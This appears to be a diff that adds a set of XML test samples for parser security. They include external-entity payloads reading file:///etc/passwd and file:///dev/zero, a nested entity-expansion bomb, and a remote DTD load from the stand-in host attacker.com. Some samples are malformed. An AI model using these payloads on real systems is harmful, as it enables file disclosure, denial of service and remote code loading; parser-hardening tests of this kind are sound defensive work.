@@ -1,0 +1,78 @@
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ELEMENT root ANY>
+  <!ATTLIST root id ID #REQUIRED>
+  <!ENTITY % param1 "value1">
+  <!ENTITY % param2 "%param1;%param1;">
+]>
+<root id="test1">
+  <child attr="&param2;">content</child>
+</root>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE catalog [
+  <!ELEMENT catalog (book)+>
+  <!ELEMENT book (title,author)>
+  <!ELEMENT title (#PCDATA)>
+  <!ELEMENT author (#PCDATA)>
+  <!ENTITY company "ACME Corp">
+  <!ENTITY % internal SYSTEM "file:///etc/passwd">
+]>
+<catalog>
+  <book>
+    <title>&company; Manual</title>
+    <author>Unknown</author>
+  </book>
+</catalog>
+```
+
+```xml
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///dev/zero">
+  <!ELEMENT svg (rect)*>
+  <!ELEMENT rect EMPTY>
+  <!ATTLIST rect width CDATA #IMPLIED>
+  <!ATTLIST rect height CDATA #IMPLIED>
+]>
+<svg>
+  <rect width="100" height="&xxe;"/>
+  <rect width="50" height="50"/>
+</svg>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE message [
+  <!ELEMENT message (from,to,body)>
+  <!ELEMENT from (#PCDATA)>
+  <!ELEMENT to (#PCDATA)>
+  <!ELEMENT body (#PCDATA)>
+  <!ENTITY % lol "lol">
+  <!ENTITY % lol2 "%lol;%lol;%lol;%lol;%lol;%lol;%lol;%lol;">
+  <!ENTITY % lol3 "%lol2;%lol2;%lol2;%lol2;%lol2;">
+]>
+<message>
+  <from>sender</from>
+  <to>recipient</to>
+  <body>Test&lol3;</body>
+</message>
+```
+
+```xml
+<!DOCTYPE config [
+  <!ELEMENT config (setting)*>
+  <!ELEMENT setting (#PCDATA)>
+  <!ATTLIST setting name CDATA #REQUIRED>
+  <!ATTLIST setting type (string|int|bool) "string">
+  <!ENTITY % remote SYSTEM "http://attacker.com/evil.xml">
+  <!ENTITY % load "%remote;">
+  %load;
+]>
+<config>
+  <setting name="debug" type="bool">true</setting>
+  <setting name="timeout" type="int">30</setting>
+</config>
+```
